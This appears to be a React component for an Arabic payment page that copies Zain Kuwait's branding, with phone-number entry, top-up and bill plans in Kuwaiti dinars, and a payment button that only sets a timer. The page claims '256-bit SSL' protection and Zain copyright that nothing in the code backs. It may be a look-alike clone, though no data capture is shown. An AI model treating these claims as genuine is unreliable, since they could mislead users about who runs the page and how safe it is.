"use client"

import type React from "react"

import {
  Plus,
  AlertCircle,
  Heart,
  Menu,
  Shield,
  CreditCard,
  Smartphone,
  Receipt,
  Package,
  Settings,
  Wifi,
  Phone,
  Loader,
} from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select"
import { Card, CardContent } from "@/components/ui/card"
import { ProfessionalSelect } from "./professional-select"
import { ProfessionalTabs } from "./professional-tabs"

export default function ZainPayment() {
  const [activeTab, setActiveTab] = useState("recharge")
  const [phoneNumber, setPhoneNumber] = useState("")
  const [selectedPlan, setSelectedPlan] = useState("30days-6000")
  const [paymentAmount, setPaymentAmount] = useState("6.000")
  const [isSubmitted, setIsSubmmited] = useState(false)

  const tabs = [
    {
      id: "recharge",
      label: "شحن الرصيد",
      icon: <Smartphone className="w-4 h-4" />,
      badge: "الأكثر استخداماً",
    },
    {
      id: "bills",
      label: "دفع الفاتورة",
      icon: <Receipt className="w-4 h-4" />,
    },
  ]

  const rechargeOptions = [
    { value: "7days-2000", label: "الصلاحية 7 أيام", price: "2.000 د.ك" },
    { value: "15days-4000", label: "الصلاحية 15 يوم", price: "4.000 د.ك" },
    { value: "30days-6000", label: "الصلاحية 30 يوم", price: "6.000 د.ك" },
    { value: "90days-12000", label: "الصلاحية 90 يوم", price: "12.000 د.ك" },
    { value: "180days-22000", label: "الصلاحية 180 يوم", price: "22.000 د.ك" },
    { value: "365days-30000", label: "الصلاحية 365 يوم", price: "30.000 د.ك" },
    { value: "other", label: "مبلغ آخر", price: "حدد المبلغ" },
  ]

  const packageOptions = [
    { value: "data-1gb", label: "باقة إنترنت 1 جيجا", price: "1.500 د.ك" },
    { value: "data-5gb", label: "باقة إنترنت 5 جيجا", price: "5.000 د.ك" },
    { value: "data-10gb", label: "باقة إنترنت 10 جيجا", price: "8.000 د.ك" },
    { value: "unlimited", label: "باقة لا محدودة", price: "15.000 د.ك" },
  ]
  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmmited(true)
    setTimeout(() => {
      setIsSubmmited(false)
    }, 3000)
  }
  const handlePlanChange = (value: string) => {
    setSelectedPlan(value)
    const amounts = {
      "7days-2000": "2.000",
      "15days-4000": "4.000",
      "30days-6000": "6.000",
      "90days-12000": "12.000",
      "180days-22000": "22.000",
      "365days-30000": "30.000",
      "data-1gb": "1.500",
      "data-5gb": "5.000",
      "data-10gb": "8.000",
      unlimited: "15.000",
      other: "0.000",
    }
    setPaymentAmount(amounts[value as keyof typeof amounts] || "6.000")
  }

  const renderTabContent = () => {
    switch (activeTab) {
      case "recharge":
        return (
          <div className="space-y-4 sm:space-y-6">
            {/* Phone Number Section */}
            <div className="space-y-3 sm:space-y-4">
              <div className="flex items-center gap-2 mb-3 sm:mb-4">
                <div className="w-6 h-6 sm:w-8 sm:h-8 bg-pink-100 rounded-full flex items-center justify-center">
                  <span className="text-pink-600 font-bold text-xs sm:text-sm">1</span>
                </div>
                <h2 className="text-base sm:text-lg font-semibold text-gray-800">معلومات الرقم</h2>
              </div>

              <div className="space-y-2">
                <label className="text-xs sm:text-sm font-medium text-gray-700 flex items-center gap-2">
                  <Phone className="w-3 h-3 sm:w-4 sm:h-4 text-pink-600" />
                  نوع الرقم
                </label>
                <Select defaultValue="other" dir="rtl">
                  <SelectTrigger className="w-full h-12 sm:h-14 text-right bg-white border-2 border-gray-200 rounded-xl hover:border-pink-300 focus:border-pink-900 transition-all duration-200 shadow-sm bg-white">
                    <SelectValue className="bg-white" />
                  </SelectTrigger>
                  <SelectContent className="rounded-xl border-2 border-gray-200 shadow-xl">
                    <SelectItem value="other" className="text-right py-3 bg-white">
                      رقم آخر
                    </SelectItem>
                    <SelectItem value="current" className="text-right py-3 bg-white">
                      الرقم الحالي
                    </SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <label className="text-xs sm:text-sm font-medium text-gray-700">رقم الهاتف</label>
                <Input
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  className="w-full h-12 sm:h-14 text-right bg-white border-2 border-gray-200 rounded-xl hover:border-pink-300 focus:border-pink-900 transition-all duration-200 shadow-sm text-base sm:text-lg font-medium"
                  placeholder="أدخل رقم الهاتف"
                  dir="rtl"
                />
              </div>
            </div>

            {/* Error Message */}
            <Card className="border-red-200 bg-red-50 shadow-sm hidden ">
              <CardContent className="p-3 sm:p-4">
                <div className="flex items-start gap-2 sm:gap-3 ">
                  <AlertCircle className=" w-4 h-4 sm:w-5 sm:h-5 text-red-500 flex-shrink-0 mt-0.5" />
                  <div>
                    <p className="text-red-700 font-medium text-xs sm:text-sm">خطأ في التحقق</p>
                    <p className="text-red-600 text-xs sm:text-sm mt-1">
                      الرقم المدخل غير صحيح أو لا يحتوي على رصيد كافٍ. يرجى المحاولة مرة أخرى.
                    </p>
                  </div>
                </div>
              </CardContent>
            </Card>

            {/* Recharge Amount Section */}
            <div className="space-y-3 sm:space-y-4">
              <div className="flex items-center gap-2 mb-3 sm:mb-4">
                <div className="w-6 h-6 sm:w-8 sm:h-8 bg-pink-100 rounded-full flex items-center justify-center">
                  <span className="text-pink-600 font-bold text-xs sm:text-sm">2</span>
                </div>
                <h2 className="text-base sm:text-lg font-semibold text-gray-800">اختر مبلغ الشحن</h2>
              </div>

              <div className="space-y-2">
                <label className="text-xs sm:text-sm font-medium text-gray-700">مبلغ التعبئة</label>
                <ProfessionalSelect
                  options={rechargeOptions}
                  value={selectedPlan}
                  onValueChange={handlePlanChange}
                  placeholder="اختر مبلغ الشحن"
                />
              </div>
            </div>
          </div>
        )

      case "bills":
        return (
          <div className="space-y-4 sm:space-y-6">
            <div className="text-center py-6 sm:py-8">
              <Receipt className="w-12 h-12 sm:w-16 sm:h-16 text-pink-300 mx-auto mb-3 sm:mb-4" />
              <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">دفع الفاتورة</h3>
              <p className="text-sm sm:text-base text-gray-600">ادفع فاتورتك الشهرية بسهولة</p>
            </div>

            <div className="space-y-3 sm:space-y-4">
              <div className="flex items-center gap-2 mb-3 sm:mb-4">
                <div className="w-6 h-6 sm:w-8 sm:h-8 bg-pink-100 rounded-full flex items-center justify-center">
                  <span className="text-pink-600 font-bold text-xs sm:text-sm">1</span>
                </div>
                <h2 className="text-base sm:text-lg font-semibold text-gray-800">معلومات الرقم</h2>
              </div>

              <div className="space-y-2">
                <label className="text-xs sm:text-sm font-medium text-gray-700 flex items-center gap-2">
                  <Phone className="w-3 h-3 sm:w-4 sm:h-4 text-pink-600" />
                  نوع الرقم
                </label>
                <Select defaultValue="other">
                  <SelectTrigger className="w-full h-12 sm:h-14 text-right bg-white border-2 border-gray-200 rounded-xl hover:border-pink-300 focus:border-pink-900 transition-all duration-200 shadow-sm">
                    <SelectValue />
                  </SelectTrigger>
                  <SelectContent className="rounded-xl border-2 border-gray-200 shadow-xl">
                    <SelectItem value="other" className="text-right py-3">
                      رقم آخر
                    </SelectItem>
                    <SelectItem value="current" className="text-right py-3">
                      الرقم الحالي
                    </SelectItem>
                  </SelectContent>
                </Select>
              </div>

              <div className="space-y-2">
                <label className="text-xs sm:text-sm font-medium text-gray-700">رقم الهاتف</label>
                <Input
                  value={phoneNumber}
                  onChange={(e) => setPhoneNumber(e.target.value)}
                  className="w-full h-12 sm:h-14 text-right bg-white border-2 border-gray-200 rounded-xl hover:border-pink-300 focus:border-pink-900 transition-all duration-200 shadow-sm text-base sm:text-lg font-medium"
                  placeholder="أدخل رقم الهاتف"
                  dir="rtl"
                />
              </div>

              {/* Recharge Amount Section */}
              <div className="space-y-3 sm:space-y-4">
                <div className="flex items-center gap-2 mb-3 sm:mb-4">
                  <div className="w-6 h-6 sm:w-8 sm:h-8 bg-pink-100 rounded-full flex items-center justify-center">
                    <span className="text-pink-600 font-bold text-xs sm:text-sm">2</span>
                  </div>
                  <h2 className="text-base sm:text-lg font-semibold text-gray-800">اختر مبلغ الشحن</h2>
                </div>

                <div className="space-y-2">
                  <label className="text-xs sm:text-sm font-medium text-gray-700">مبلغ التعبئة</label>
                  <ProfessionalSelect
                    options={rechargeOptions}
                    value={selectedPlan}
                    onValueChange={handlePlanChange}
                    placeholder="اختر مبلغ الشحن"
                  />
                </div>
              </div>
            </div>
          </div>
        )

      case "packages":
        return (
          <div className="space-y-4 sm:space-y-6">
            <div className="text-center py-4 sm:py-4">
              <Package className="w-12 h-12 sm:w-16 sm:h-16 text-pink-300 mx-auto mb-3 sm:mb-4" />
              <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">باقات الإنترنت</h3>
              <p className="text-sm sm:text-base text-gray-600">اختر الباقة المناسبة لك</p>
            </div>

            <div className="space-y-3 sm:space-y-4">
              <div className="space-y-2">
                <label className="text-xs sm:text-sm font-medium text-gray-700 flex items-center gap-2">
                  <Wifi className="w-3 h-3 sm:w-4 sm:h-4 text-pink-600" />
                  باقات الإنترنت
                </label>
                <ProfessionalSelect
                  options={packageOptions}
                  value={selectedPlan}
                  onValueChange={handlePlanChange}
                  placeholder="اختر باقة الإنترنت"
                />
              </div>
            </div>
          </div>
        )

      case "services":
        return (
          <div className="space-y-4 sm:space-y-6">
            <div className="text-center py-6 sm:py-8">
              <Settings className="w-12 h-12 sm:w-16 sm:h-16 text-pink-300 mx-auto mb-3 sm:mb-4" />
              <h3 className="text-lg sm:text-xl font-semibold text-gray-800 mb-2">الخدمات الإضافية</h3>
              <p className="text-sm sm:text-base text-gray-600">خدمات متنوعة لتلبية احتياجاتك</p>
            </div>

            <div className="grid grid-cols-2 gap-3 sm:gap-4">
              <Card className="border-2 border-pink-200 hover:border-pink-900 transition-colors cursor-pointer">
                <CardContent className="p-3 sm:p-4 text-center">
                  <Phone className="w-6 h-6 sm:w-8 sm:h-8 text-pink-600 mx-auto mb-2" />
                  <p className="text-xs sm:text-sm font-medium">خدمة العملاء</p>
                </CardContent>
              </Card>

              <Card className="border-2 border-pink-200 hover:border-pink-900 transition-colors cursor-pointer">
                <CardContent className="p-3 sm:p-4 text-center">
                  <Shield className="w-6 h-6 sm:w-8 sm:h-8 text-pink-600 mx-auto mb-2" />
                  <p className="text-xs sm:text-sm font-medium">الحماية المتقدمة</p>
                </CardContent>
              </Card>
            </div>
          </div>
        )

      default:
        return null
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-50 to-gray-100" dir="rtl">
      {/* Responsive Header */}
      <header className="bg-gradient-to-r from-pink-900 to-pink-800 text-white shadow-xl">
        <div className="px-4 sm:px-6 py-3 sm:py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-2 sm:gap-3">
              <img src="z.png" alt="logo" width={90} />
            </div>
            <div className="flex items-center gap-2 sm:gap-3">
              <button className="p-1.5 sm:p-2 hover:bg-white/10 rounded-lg transition-colors">
                <Heart className="w-4 h-4 sm:w-5 sm:h-5" />
              </button>
              <button className="p-1.5 sm:p-2 hover:bg-white/10 rounded-lg transition-colors">
                <Menu className="w-4 h-4 sm:w-5 sm:h-5" />
              </button>
              <div className="text-right hidden sm:block">
                <div className="text-xs text-pink-200">مرحباً بك في</div>
              </div>
              <div className="text-right sm:hidden"></div>
            </div>
          </div>
        </div>
      </header>
      <div className="px-4 sm:px-6 pb-4 sm:pb-6 ">
        <h1 className="text-lg sm:text-2xl font-bold text-center text-black pt-9">الدفع السريع </h1>
        <p className="text-center text-pink-700 font-bold  text-sm sm:text-sm mt-1 sm:mt-2">جميع خدماتك في مكان واحد</p>
      </div>
      {/* Responsive Main Content */}
      <div className="px-4 sm:px-6 lg:px-8 py-4 sm:py-8">
        <div className="max-w-sm sm:max-w-md lg:max-w-2xl xl:max-w-4xl mx-auto">
          <div className="lg:grid lg:grid-cols-3 lg:gap-8">
            {/* Main Content Area */}
            <div className="col-span-2">
              <ProfessionalTabs tabs={tabs} defaultTab="recharge" onTabChange={setActiveTab}>
                {renderTabContent()}

                {/* Add Another Number - Only show for recharge and packages */}
                {(activeTab === "recharge" || activeTab === "packages") && (
                  <Card className="border-2 border-dashed border-pink-200 bg-pink-50/30 hover:bg-pink-50/50 transition-colors cursor-pointer group mt-4 sm:mt-6">
                    <CardContent className="p-3 sm:p-4">
                      <Button
                        variant="ghost"
                        className="w-full h-10 sm:h-12 flex items-center justify-center gap-2 sm:gap-3 text-pink-900 hover:text-pink-900 hover:bg-transparent group-hover:scale-105 transition-all duration-200"
                      >
                        <Plus className="w-4 h-4 sm:w-5 sm:h-5" />
                        <span className="font-medium text-sm sm:text-base">إضافة رقم آخر للدفع</span>
                      </Button>
                    </CardContent>
                  </Card>
                )}
              </ProfessionalTabs>
            </div>

            {/* Sidebar for Desktop */}
            <div className="lg:col-span-1 mt-6 lg:mt-0">
              {/* Total Summary */}
              <Card className="bg-gradient-to-r from-green-50 to-emerald-50 border-2 border-green-200 shadow-lg sticky top-4">
                <CardContent className="p-4 sm:p-6">
                  <div className="flex justify-between items-center">
                    <div className="text-right">
                      <div className="text-xl sm:text-2xl font-bold text-green-700">{paymentAmount} د.ك</div>
                      <div className="text-green-600 text-xs sm:text-sm font-medium">المبلغ الإجمالي</div>
                    </div>
                    <div className="text-gray-600 font-semibold text-sm sm:text-lg">الإجمالي</div>
                  </div>
                  <div className="mt-3 sm:mt-4 pt-3 sm:pt-4 border-t border-green-200">
                    <div className="flex items-center justify-center gap-2 text-green-600 text-xs sm:text-sm">
                      <Shield className="w-3 h-3 sm:w-4 sm:h-4" />
                      <span>دفع آمن ومشفر</span>
                    </div>
                  </div>
                </CardContent>
              </Card>

              {/* Payment Button */}
              <Button
                onClick={handleSubmit}
                disabled={isSubmitted || phoneNumber.length < 8}
                className="w-full h-12 sm:h-14 bg-[#a3035f] hover:from-pink-900 hover:to-pink-900 text-white font-bold text-sm sm:text-lg rounded-xl shadow-lg hover:shadow-xl transform hover:scale-[1.02] transition-all duration-200 mt-4 sm:mt-6"
              >
                <CreditCard className="w-4 h-4 sm:w-5 sm:h-5 ml-2" />
                تأكيد الدفع الآن
                {isSubmitted && <Loader className="animate-spin" />}{" "}
              </Button>

              {/* Security Notice */}
              <div className="text-center text-xs text-gray-500 mt-3 sm:mt-4">
                <p>جميع المعاملات محمية بتشفير SSL 256-bit</p>
                <p className="mt-1">شركة زين - الكويت © 2024</p>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}
